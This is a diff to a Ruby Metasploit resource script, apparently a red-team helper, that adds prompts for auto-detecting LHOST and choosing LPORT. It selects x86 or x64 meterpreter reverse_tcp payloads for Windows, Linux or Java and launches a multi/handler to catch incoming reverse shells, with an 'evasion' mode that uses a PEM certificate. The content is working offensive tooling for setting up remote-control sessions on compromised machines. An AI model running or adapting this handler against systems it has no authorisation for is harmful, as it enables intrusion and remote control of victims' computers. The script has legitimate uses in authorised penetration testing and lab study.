@@ -10,7 +10,7 @@
        r00t-3xp10it  <pedroubuntu10[at]gmail.com>
    |
    print_line(help)
-   Rex::sleep(0.5)
+   Rex::sleep(1.5)
    menu = %Q|
     Command    Description                  platform
     -------    -----------                  --------      
@@ -28,50 +28,74 @@
       ## SIMPLE MULTI/HANDLER
       if user_input == "handler"
       ## User inputs
-      print "[+] Input platform to exploit (Windows|Linux|Java): "
+      print "[+] Platform to exploit : (Windows|Linux|Java): "
       user_platform = gets.chomp
       unless user_platform =~ /(Windows|Linux|Java)/i
          print_error("Platform NOT supported: #{user_platform}")
          run_single("back")
          return nil
       end
-      print "[+] Use 192.168.1.71 as LHOST (y/n)?: "
+      ## Store lhost address
+      ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
+      print "[+] Use LHOST           : #{ip} (y/n)? : "
       get_host = gets.chomp
          ## Sellect LHOST ip addr
          if get_host == "y" or get_host == "Y"
-            remote_host = "192.168.1.71"
+            remote_host = "#{ip}"
          else
-            print "[+] Input LHOST: "
+            print "[+] Input LHOST         : "
             get_addr = gets.chomp
             remote_host = "#{get_addr}"
+         end
+      ## Sellect lport number
+      print "[+] Use LPORT           : 666          (y/n)? : "
+      get_port = gets.chomp
+         if get_port == "y" or get_port == "Y"
+            remote_port = "666"
+         else
+            print "[+] Input LPORT         : "
+            query_port = gets.chomp
+            remote_port = "#{query_port}"
          end
 
 
       ## MULTI/HANDLER AUTORUNSCRIPT
       elsif user_input == "resource"
       ## User inputs
-      print "[+] Input platform to exploit (Windows|Linux|Java): "
+      print "[+] Platform to exploit : (Windows|Linux|Java): "
       user_platform = gets.chomp
       unless user_platform =~ /(Windows|Linux|Java)/i
          print_error("Platform NOT supported: #{user_platform}")
          run_single("back")
          return nil
       end
-      print "[+] Use 192.168.1.71 as LHOST (y/n)?: "
+      ## Store lhost address
+      ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
+      print "[+] Use LHOST           : #{ip} (y/n)? : "
       get_host = gets.chomp
          ## Sellect LHOST ip addr
          if get_host == "y" or get_host == "Y"
-            remote_host = "192.168.1.71"
+            remote_host = "#{ip}"
          else
-            print "[+] Input LHOST: "
+            print "[+] Input LHOST         : "
             get_addr = gets.chomp
             remote_host = "#{get_addr}"
          end
-      print "[+] Input resouce file absoluct path: "
+      ## Sellect lport number
+      print "[+] Use LPORT           : 666          (y/n)? : "
+      get_port = gets.chomp
+         if get_port == "y" or get_port == "Y"
+            remote_port = "666"
+         else
+            print "[+] Input LPORT         : "
+            query_port = gets.chomp
+            remote_port = "#{query_port}"
+         end
+      print "[+] Input resouce file absoluct path          : "
       get_path = gets.chomp
       ## Make sure that resource file exists (local)
       unless (File.exist?(get_path))
-         print_error("Absoluct path NOT found: #{get_path}")
+         print_error("Absoluct path NOT found                   : #{get_path}")
          run_single("back")
          return nil
       end
@@ -79,28 +103,40 @@
 
       elsif user_input == "evasion"
       ## User inputs
-      print "[+] Input platform to exploit (Windows|Linux|Java): "
+      print "[+] Platform to exploit : (Windows|Linux|Java): "
       user_platform = gets.chomp
       unless user_platform =~ /(Windows|Linux|Java)/i
          print_error("Platform NOT supported: #{user_platform}")
          run_single("back")
          return nil
       end
-      print "[+] Use 192.168.1.71 as LHOST (y/n)?: "
+      ## Store lhost address
+      ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
+      print "[+] Use LHOST           : #{ip} (y/n)? : "
       get_host = gets.chomp
          ## Sellect LHOST ip addr
          if get_host == "y" or get_host == "Y"
-            remote_host = "192.168.1.71"
+            remote_host = "#{ip}"
          else
-            print "[+] Input LHOST: "
+            print "[+] Input LHOST         : "
             get_addr = gets.chomp
             remote_host = "#{get_addr}"
          end
-      print "[+] Input PEM file absoluct path: "
+      ## Sellect lport number
+      print "[+] Use LPORT           : 445          (y/n)? : "
+      get_port = gets.chomp
+         if get_port == "y" or get_port == "Y"
+            remote_port = "445"
+         else
+            print "[+] Input LPORT         : "
+            query_port = gets.chomp
+            remote_port = "#{query_port}"
+         end
+      print "[+] Input PEM file absoluct path              : "
       get_pem = gets.chomp
       ## Make sure that PEM.pem file exists (local)
       unless (File.exist?(get_pem))
-         print_error("cert.pem Absoluct path NOT found: #{get_pem}")
+         print_error("cert.pem Absoluct path NOT found          : #{get_pem}")
          run_single("back")
          return nil
       end
@@ -114,11 +150,20 @@
       end
 
 
+      user_arch = `uname -m`
       ## Sellect session platform (payload)
-      if (user_platform =~ /Windows/i)  
-         payload = "windows/meterpreter/reverse_tcp"
+      if (user_platform =~ /Windows/i)
+         if user_arch =~ /i686/
+            payload = "windows/meterpreter/reverse_tcp"
+         else
+            payload = "windows/x64/meterpreter/reverse_tcp"
+         end
       elsif (user_platform =~ /Linux/i)
-         payload = "linux/x86/meterpreter/reverse_tcp"
+         if user_arch =~ /i686/
+            payload = "linux/x86/meterpreter/reverse_tcp"
+         else
+            payload = "linux/x64/meterpreter/reverse_tcp"
+         end
       else
          payload = "java/meterpreter/reverse_tcp"
       end
@@ -140,7 +185,7 @@
          end
       run_single("set ExitOnSession false")
       run_single("set LHOST #{remote_host}")
-      run_single("set LPORT 666")
+      run_single("set LPORT #{remote_port}")
    run_single("exploit")
    run_single("back")
 </ruby>
